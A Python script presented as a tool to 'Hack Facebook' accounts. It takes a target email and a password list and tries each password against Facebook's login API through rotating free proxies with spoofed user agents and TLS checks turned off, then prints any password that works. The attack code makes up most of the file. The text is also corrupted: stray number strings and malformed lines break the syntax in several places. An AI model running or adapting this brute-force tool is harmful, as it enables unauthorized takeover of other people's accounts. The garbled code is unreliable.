import requests
import random
from time import sleep
import json
import sys
import uuid
import os
from user_agent import generate_user_agent
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import threading

R = '\033[2;31m'
G = '\033[2;32m'
Y = '\033[2;33m'
P = '\033[2;34m'
H = '\033[2;35m'
C = '\033[2;36m'
W = '\033[2;37m'
de = 'https://t.me/M_3_7_1'

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
#Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
#C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
#Y = '\033[1;34m' #ازرق فاتح

W = '\033[2;37m'
def s(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0.5/10)

s(G+' Welcome To Best Tool In Telegram For Hack Facebook')
print('')
print('')
s(H+' This Tool Made By DeadCode & Mr.Black ')
print('')
print('')
def logo():deadcode_22
   
 #   p = pyfiglet.figlet_format('Hack - FB')
  #  print(F+p)
    print('')
    print('')
    print(f"{B}  ▄▅▆▇ AUTHOR : DeadCode ▇▆▅▄▂▁")
    print(f"{H}  ▄▅▆▇ TELEGRAM : deadcode_22  ▇▆▅▄▂▁")
    print(f"{X}  ▄▅▆▇ PROTHER : BlackZomby ▇▆▅▄▂▁")
    print(f"{G}  ▄▅▆▇ Hack FB Accounts    ▇▆▅▄▂▁")
    print('')
    print('')
    print('')

logo()
s(' Wait Tool Is Loading.... ')
sleep(5)
os.system('clear')
logo(0557550626)logo(0557550626)


print(H+' - '*20+'\n'+P+' ( + ) '+' dev &» '+ C+de+'\n'+H+' - '*20)

email = input(P+' ( + ) '+Y+'Enter Email Facebock: '+W)
bass = input(P+' ( + ) '+Y+'Enter List Password : '+W)

try:
    file = open(f'{bass}', "r")    
except:
    exit(R+' ♕ Not found your list ')   

def check(file,email):
 ro = file.readline()
 te = len(ro)
 ded = 0    
 while True:
      ded += 1
      re = file.readline().split('\n')[0]
      if re =='':
          exit(R+' List is finished ')    
      password = str(re)    
  
      try:
          proxies = requests.get('https://gimmeproxy.com/api/getProxy').json()['curl']
          proxy = proxies.split('//')[1]
                 
          url = "https://b-graph.facebook.com/auth/login"
          headers = {
            "authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
            "user-agent": str(generate_user_agent())
        }
          data = f"email={email}&password={password}&credentials_type=password&error_detail_type=button_with_disabled&format=json&device_id={uuid.uuid4()}&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&method=POST"
          requests.packages.urllib3.disable_warnings(InsecureRequestWarning)     
          response = requests.post(url, headers=headers, json=data,proxies=proxies, verify=False, timeout=15).json()
          print(response)
          if list(response)[0] == "session_key":
              print(P+' ( + ) '+G+f'Good Password {W}({G}{password}{W}) ')
          elif "We are having technical difficulties and are actively working on a fix. Please try again in a few minutes." in response:
              print(P+' ( + ) '+R+f"Bad Proxy : {proxy}")
              sleep(20)        
          elif '' in response:
              print(P+' ( + ) '+R+f"Bad Proxy : {proxy}")
              sleep(20)
              acc = G+f"""
⌯ email successful ✅ ⌯         
. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .        
⌯ Number ➥ {email}                    
⌯ Password ➥ {password}                
. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .        
⚖️ Tele : @deadcode_22    """
              print(acc)
              sys.exit(P+' ( + ) '+Y+'See You Soon ')
          else:0557550626


              print(P+' ( + ) '+R+f'Bad Password {W}({R}{password}{W}) ({ded}/{te}) ') 
              sleep(1)       0557550626
              


         
      except requests.exceptions.ConnectionError:
       print(P+' ( + ) '+R+f"Bad Proxy : {proxy}")
      except:0557550626
       pass 0557550626

check(file,email)			                          
